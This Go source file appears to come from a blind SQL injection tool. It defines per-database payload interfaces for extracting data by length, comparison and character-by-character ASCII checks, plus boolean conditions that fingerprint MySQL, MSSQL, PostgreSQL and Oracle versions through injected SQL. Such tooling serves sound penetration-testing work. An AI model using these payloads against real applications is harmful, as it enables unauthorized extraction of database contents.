package payloads

// DatabaseType represents supported database types
type DatabaseType int

const (
	Unknown DatabaseType = iota
	MySQL
	MSSQL
	PostgreSQL
	Oracle
)

// DatabasePayloads defines the interface for database-specific payloads
type DatabasePayloads interface {
	// GetType returns the database type
	GetType() DatabaseType

	// GetName returns the database name
	GetName() string

	// GetVersionQueries returns queries to extract version
	GetVersionQueries() []string

	// GetLengthPayload returns a payload to check if length > n
	GetLengthPayload(query string, n int) string

	// GetComparisonPayload returns a payload to check if (query) > n (for numeric values)
	GetComparisonPayload(query string, n int) string

	// GetEqualityPayload returns a payload to check if ASCII(char_at_pos) = charCode
	GetEqualityPayload(query string, pos int, charCode int) string

	// GetCharPayload returns a payload to check if ASCII of char at pos > n
	GetCharPayload(query string, pos int, n int) string

	// GetSubstringFunc returns the substring function for this database
	GetSubstringFunc() string

	// GetLengthFunc returns the length function for this database
	GetLengthFunc() string

	// WrapCondition wraps a condition with proper SQL syntax
	WrapCondition(condition string) string
}

// GetPayloadsForDatabase returns the appropriate payloads for a database type
func GetPayloadsForDatabase(dbType DatabaseType) DatabasePayloads {
	switch dbType {
	case MySQL:
		return &MySQLPayloads{}
	case MSSQL:
		return &MSSQLPayloads{}
	case PostgreSQL:
		return &PostgreSQLPayloads{}
	case Oracle:
		return &OraclePayloads{}
	default:
		return nil
	}
}

// AllDatabasePayloads returns payloads for all supported databases
func AllDatabasePayloads() []DatabasePayloads {
	return []DatabasePayloads{
		&MySQLPayloads{},
		&MSSQLPayloads{},
		&PostgreSQLPayloads{},
		&OraclePayloads{},
	}
}

// VersionDetectionPayload represents a payload for version detection
type VersionDetectionPayload struct {
	Database    DatabaseType
	Name        string
	TrueQuery   string // Should return TRUE if this is the correct DB
	FalseQuery  string // Should return FALSE if this is the correct DB
	Description string
}

// GetAllVersionDetectionPayloads returns payloads for detecting each database
// These are pure boolean conditions for CASE WHEN context
func GetAllVersionDetectionPayloads() []VersionDetectionPayload {
	return []VersionDetectionPayload{
		// MySQL detection - version() returns something like "8.0.32"
		{
			Database:    MySQL,
			Name:        "MySQL",
			TrueQuery:   "SUBSTRING(version(),1,1) BETWEEN '0' AND '9'",
			FalseQuery:  "SUBSTRING(version(),1,1)='z'",
			Description: "MySQL version() function",
		},
		{
			Database:    MySQL,
			Name:        "MySQL",
			TrueQuery:   "SUBSTRING(@@version,1,1) BETWEEN '0' AND '9'",
			FalseQuery:  "SUBSTRING(@@version,1,1)='z'",
			Description: "MySQL @@version variable",
		},
		// MSSQL detection - @@version starts with 'Microsoft'
		{
			Database:    MSSQL,
			Name:        "MSSQL",
			TrueQuery:   "SUBSTRING(@@version,1,1)='M'",
			FalseQuery:  "SUBSTRING(@@version,1,1)='z'",
			Description: "MSSQL @@version variable",
		},
		// PostgreSQL detection - version() starts with 'PostgreSQL'
		{
			Database:    PostgreSQL,
			Name:        "PostgreSQL",
			TrueQuery:   "SUBSTRING(version(),1,1)='P'",
			FalseQuery:  "SUBSTRING(version(),1,1)='z'",
			Description: "PostgreSQL version() function",
		},
		// Oracle detection - banner from v$version contains 'Oracle'
		{
			Database:    Oracle,
			Name:        "Oracle",
			TrueQuery:   "(SELECT SUBSTR(banner,1,1) FROM v$version WHERE ROWNUM=1)='O'",
			FalseQuery:  "(SELECT SUBSTR(banner,1,1) FROM v$version WHERE ROWNUM=1)='z'",
			Description: "Oracle v$version banner",
		},
		{
			Database:    Oracle,
			Name:        "Oracle",
			TrueQuery:   "(SELECT SUBSTR(version,1,1) FROM v$instance)>'0'",
			FalseQuery:  "(SELECT SUBSTR(version,1,1) FROM v$instance)='z'",
			Description: "Oracle v$instance version",
		},
	}
}
